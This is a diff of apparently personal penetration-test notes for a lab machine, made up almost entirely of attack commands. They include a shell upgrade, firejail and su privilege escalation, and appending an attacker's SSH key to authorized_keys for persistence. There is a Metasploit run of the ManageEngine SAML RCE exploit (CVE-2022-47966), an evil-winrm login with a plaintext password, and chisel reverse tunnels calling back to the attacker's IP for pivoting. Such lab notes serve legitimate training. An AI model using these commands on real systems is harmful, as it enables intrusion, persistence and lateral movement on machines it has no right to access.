@@ -119,7 +119,6 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 firejail --join=9159
 su -
 
-
 echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0fQqdcN8qxqB3OH9lCBMyGcAz+c8a5uRxuvif1A98/jv5LLYy/2GO7r68nHOSIviFtkbnydmuTyzBBSWhbxC/MWAX8XZx5C3rF598/phDzwN4seus2SMhZi5zUZ6iylBBI8xht5J+u/InI6BlsXQ65H3xw+yFxndxeKi3Gu17glt3OEe8aAPaxj3qU89L1xbOr4m3mSqnhJne7eV05nqYvZDHP+pgOQE02dmmplRfTHCKbEfwqY/nDx7QWw6WtrQigNlEGNcWJUVKNlXBGoGHZuyHNMpoh4XjinLeM9GKFY4xRxk2CyFBLwlouOtj7s5EtFB5CLnaQMpDtzI+gJyma7nzxJZxELrlTHyjPJoQHQSmlQe+tBNBRAEL92wac79psK7s3PARdCcyEnpe8l9cplPP8YIS8tMg6BVVjTGPQNN0BJBwRxEjrvAKae1phztkQD7tZKy3aEl8VCUR8tpJ0fw0mK6/PJGxgCYXZWWKwycHOnJKQYDL17qsTypaLL8= kali@kali" >> authorized_keys
 
 
@@ -247,6 +246,7 @@ we can use
 `use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966`
 set issuer_url http://dc.cerberus.local/adfs/services/trust
 set rhosts 127.0.0.1
+set rhosts 172.16.22.1
 set lhost 10.10.16.24
 set lport 7777
 exploit
@@ -267,6 +267,31 @@ evil-winrm -i 10.10.16.24 -u matthew -p 147258369
 
 since 10.10.16.24 is our ip
 
-this will not wokr because then it needs two layers of proxy
+this will not wokr because then it needs two layers of proxy so we will use socks proxy to get in then try using chisel proxy.
 
-.\chisel client 10.10.16.24:8001 R:1080:socks
+./chisel client 10.10.16.24:8001 R:1080:socks
+
+
+on windows
+
+/chisel.exe client 10.10.11.205:9091 R:80:localhost:80 R:443:localhost:443 R:8888:localhost:8888 R:9251:localhost:9251
+
+./chisel client 10.10.16.24:8082 R:80:localhost:80
+
+
+use exploit/multi/http/manageengine_adselfservice_plus_saml_rce_cve_2022_47966
+
+the machine is not connected to internet somehow
+
+echo "nameserver 10.10.16.24" >> /etc/resolv.conf
+
+sudo ./chisel server -p 8082 --reverse 
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+.\chisel.exe client 172.16.22.2:9094 R:443:localhost:443
+R:443:localhost:443 R:8888:localhost:8888 R:9251:localhost:9251
+
+./chisel server -p 9094 --reverse
+
+./chisel client 10.10.16.24:8006 R:443:localhost:443
+
